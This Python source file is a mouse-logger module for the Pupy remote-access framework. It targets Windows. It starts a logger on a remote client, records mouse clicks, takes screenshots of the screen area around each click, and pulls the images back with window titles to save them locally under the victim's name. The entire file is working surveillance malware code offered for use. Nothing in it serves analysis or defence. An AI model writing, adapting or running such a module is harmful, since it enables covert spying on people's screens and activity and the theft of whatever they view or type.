# -*- coding: utf-8 -*-
# Copyright (c) 2015, Nicolas VERDIER (contact@n1nj4.eu)
# All rights reserved.

from pupylib.PupyModule import *
import logging
import traceback
import time
import os
import os.path
import zlib

from pupylib.utils.rpyc_utils import obtain, redirected_stdo

__class_name__="MouseLoggerModule"

@config(compat="windows", cat="gather")
class MouseLoggerModule(PupyModule):
    """ log mouse clicks and take screenshots of areas around it """
    # WARNING : screenshots are kept in memory before beeing dumped
    #TODO change that and add a callback to automatically send back screenshots without need for dumping
    unique_instance = True
    dependencies = [ 'pupwinutils.mouselogger' ]

    @classmethod
    def init_argparse(cls):
        cls.arg_parser = PupyArgumentParser(prog='mouselogger', description=cls.__doc__)
        cls.arg_parser.add_argument('action', choices=['start', 'stop', 'dump'])

    def run(self, args):
        mouselogger = self.client.conn.modules['pupwinutils.mouselogger']

        if args.action == 'start':
            mouselogger.mouselogger_start()

        elif args.action == 'dump':
            self.success("dumping recorded mouse clicks :")
            screenshots_list=obtain(mouselogger.mouselogger_dump())

            self.success("%s screenshots taken"%len(screenshots_list))
            try:
                os.makedirs(os.path.join("data","mouselogger"))
            except Exception:
                pass

            for d, height, width, exe, win_title, buf in screenshots_list:
                try:
                    filepath = os.path.join(
                        "data",
                        "mouselogger",
                        "scr_"+self.client.short_name()+"_"+win_title.decode(
                            "utf8",errors="ignore"
                        ).replace(" ","_").replace("\\","").replace(
                            "/",""
                        )+"_"+d.replace(" ","_").replace(":","-")+".png")

                    with open(filepath, 'w+') as output:
                        output.write(buf.decode('base64'))
                        self.info("screenshot saved to {}".format(filepath))

                except Exception as e:
                    self.error("Error saving a screenshot: %s"%str(e))

        elif args.action=="stop":
            mouselogger.mouselogger_stop()
